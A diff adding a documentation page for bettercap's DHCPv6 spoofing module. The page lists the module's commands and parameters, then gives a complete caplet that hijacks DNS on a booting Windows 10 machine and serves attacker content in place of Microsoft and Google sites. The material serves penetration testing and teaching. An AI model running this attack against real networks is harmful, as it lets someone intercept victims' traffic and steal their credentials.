@@ -1,0 +1,48 @@
+---
+title: "dhcp6.spoof"
+date: 2019-02-25T13:02:36+01:00
+draft: false
+weight: 3
+---
+
+Replies to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attacker host as default DNS server (as described [here](https://github.com/fox-it/mitm6/)), must be used together with the [dns.spoof](https://github.com/bettercap/bettercap/wiki/dns.spoof) module.
+
+**Commands**
+
+| command | description |
+|---------|-------------|
+| `dhcp6.spoof on` | Start the DHCPv6 spoofer in the background. |
+| `dhcp6.spoof off` | Stop the DHCPv6 spoofer in the background. |
+
+**Parameters**
+
+| parameter | default | description |
+|-----------|---------|-------------|
+| `dhcp6.spoof.domains` | `microsoft.com, goole.com, facebook.com, apple.com, twitter.com` | Comma separated values of domain names to spoof. | 
+
+**Examples**
+
+The following is the [mitm6.cap](https://github.com/bettercap/caplets/blob/master/mitm6.cap) caplet performing the full DHCPv6 attack versus a Windows 10 machine which is booting:
+
+```sh
+# let's spoof Microsoft and Google ^_^
+set dns.spoof.domains microsoft.com, google.com
+set dhcp6.spoof.domains microsoft.com, google.com
+
+# every request http request to the spoofed hosts will come to us
+# let's give em some contents
+set http.server.path caplets/www
+
+# serve files
+http.server on
+# redirect DNS request by spoofing DHCPv6 packets
+dhcp6.spoof on
+# send spoofed DNS replies ^_^
+dns.spoof on
+
+# set a custom prompt for ipv6
+set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
+# clear the events buffer and the screen
+events.clear
+clear
+```
